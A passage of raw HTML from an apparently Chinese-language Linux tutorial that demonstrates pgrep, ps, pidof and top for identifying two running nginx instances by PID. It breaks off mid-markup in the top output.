class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalan@workstation:~$ pgrep -u alan nginx\r\n20520\r\n20521</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11a5482782695-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11a5482782695-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11a5482782695-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6700d11a5482782695-1\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pgrep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">alan </span><span class=\"crayon-i\">nginx</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11a5482782695-2\"><span class=\"crayon-cn\">20520</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11a5482782695-3\"><span class=\"crayon-cn\">20521</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0030 seconds] -->\r\n<p></p>\n<h4 id=\"toc_9\">PIDOF</h4>\n<p>另一个好用的是 <code>pidof</code>。此命令将检查特定二进制文件的 PID，即使另一个同名进程正在运行。为了建立一个例子，我将我的 Nginx 复制到第二个目录，并以相应的路径前缀启动。在现实生活中，这个实例可能位于不同的位置，例如由不同用户拥有的目录。如果我运行两个 Nginx 实例，则<code>pidof</code> 输出显示它们的所有进程。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6700d11a8810035350\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalan@workstation:~$ ps -ef |grep nginx\r\nalan     20881  1454  0 11:18 ?        00:00:00 nginx: master process ./nginx -p /home/alan/web/prod/nginxsec\r\nalan     20882 20881  0 11:18 ?        00:00:00 nginx: worker process\r\nalan     20895  1454  0 11:19 ?        00:00:00 nginx: master process nginx\r\nalan     20896 20895  0 11:19 ?        00:00:00 nginx: worker process</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11a8810035350-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11a8810035350-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11a8810035350-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11a8810035350-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11a8810035350-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6700d11a8810035350-1\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ps</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">ef</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-e\">grep </span><span class=\"crayon-e\">nginx</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11a8810035350-2\"><span class=\"crayon-i\">alan</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20881</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">1454</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">18</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">master </span><span class=\"crayon-i\">process</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">alan</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">web</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">prod</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nginxsec</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11a8810035350-3\"><span class=\"crayon-i\">alan</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20882</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20881</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">18</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">worker </span><span class=\"crayon-e\">process</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11a8810035350-4\"><span class=\"crayon-i\">alan</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20895</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">1454</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">19</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">master </span><span class=\"crayon-e\">process </span><span class=\"crayon-e\">nginx</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11a8810035350-5\"><span class=\"crayon-i\">alan</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20896</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20895</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">19</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">worker </span><span class=\"crayon-v\">process</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0111 seconds] -->\r\n<p>使用 <code>grep</code> 或 <code>pgrep</code> 将显示 PID 数字，但我们可能无法辨别哪个实例是哪个。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6700d11ac401477732\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalan@workstation:~$ pgrep nginx\r\n20881\r\n20882\r\n20895\r\n20896</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11ac401477732-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11ac401477732-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11ac401477732-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11ac401477732-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11ac401477732-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6700d11ac401477732-1\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pgrep </span><span class=\"crayon-i\">nginx</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11ac401477732-2\"><span class=\"crayon-cn\">20881</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11ac401477732-3\"><span class=\"crayon-cn\">20882</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11ac401477732-4\"><span class=\"crayon-cn\">20895</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11ac401477732-5\"><span class=\"crayon-cn\">20896</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p><code>pidof</code> 命令可用于确定每个特定 Nginx 实例的 PID。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6700d11af881876713\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalan@workstation:~$ pidof /home/alan/web/prod/nginxsec/sbin/nginx\r\n20882 20881\r\n\r\nalan@workstation:~$ pidof /home/alan/web/prod/nginx/sbin/nginx\r\n20896 20895</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11af881876713-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11af881876713-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11af881876713-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11af881876713-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11af881876713-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6700d11af881876713-1\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pidof</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">alan</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">web</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">prod</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginxsec</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">nginx</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11af881876713-2\"><span class=\"crayon-cn\">20882</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20881</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11af881876713-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11af881876713-4\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pidof</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">alan</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">web</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">prod</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">nginx</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11af881876713-5\"><span class=\"crayon-cn\">20896</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20895</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0081 seconds] -->\r\n<p></p>\n<h4 id=\"toc_10\">TOP</h4>\n<p><code>top</code> 命令已经有很久的历史了，对于查看运行进程的细节和快速识别内存消耗等问题是非常有用的。其默认视图如下所示。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6700d11b2434668897\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntop - 11:56:28 up 1 day, 13:37,  1 user,  load average: 0.09, 0.04, 0.03\r\nTasks: 292 total,   3 running, 225 sleeping,   0 stopped,   0 zombie\r\n%Cpu(s):  0.1 us,  0.2 sy,  0.0 ni, 99.7 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\r\nKiB Mem : 16387132 total, 10854648 free,  1859036 used,  3673448 buff/cache\r\nKiB Swap:        0 total,        0 free,        0 used. 14176540 avail Mem\r\n\r\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND\r\n17270 alan      20   0 3930764 247288  98992 R   0.7  1.5   5:58.22 gnome-shell\r\n20496 alan      20   0  816144  45416  29844 S   0.5  0.3   0:22.16 gnome-terminal-\r\n21110 alan      20   0   41940   3988   3188 R   0.1  0.0   0:00.17 top\r\n    1 root      20   0  225564   9416   6768 S   0.0  0.1   0:10.72 systemd\r\n    2 root      20   0       0      0      0 S   0.0  0.0   0:00.01 kthreadd\r\n    4 root       0 -20       0      0      0 I   0.0  0.0   0:00.00 kworker/0:0H\r\n    6 root       0 -20       0      0      0 I   0.0  0.0   0:00.00 mm_percpu_wq\r\n    7 root      20   0       0      0      0 S   0.0  0.0   0:00.08 ksoftirqd/0</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11b2434668897-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11b2434668897-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11b2434668897-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11b2434668897-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11b2434668897-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11b2434668897-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11b2434668897-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11b2434668897-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11b2434668897-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11b2434668897-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11b2434668897-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11b2434668897-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11b2434668897-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11b2434668897-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11b2434668897-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11b2434668897-16\">16</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6700d11b2434668897-1\"><span class=\"crayon-v\">top</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">56</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">28</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">up</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">day</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">13</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">37</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">user</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-e\">load </span><span class=\"crayon-v\">average</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.09</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.04</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.03</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11b2434668897-2\"><span class=\"crayon-v\">Tasks</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">292</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">total</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">running</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">225</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sleeping</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">stopped</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">zombie</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11b2434668897-3\"><span class=\"crayon-ta\">%</span><span class=\"crayon-e\">Cpu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">s</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0.1</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">us</span><span 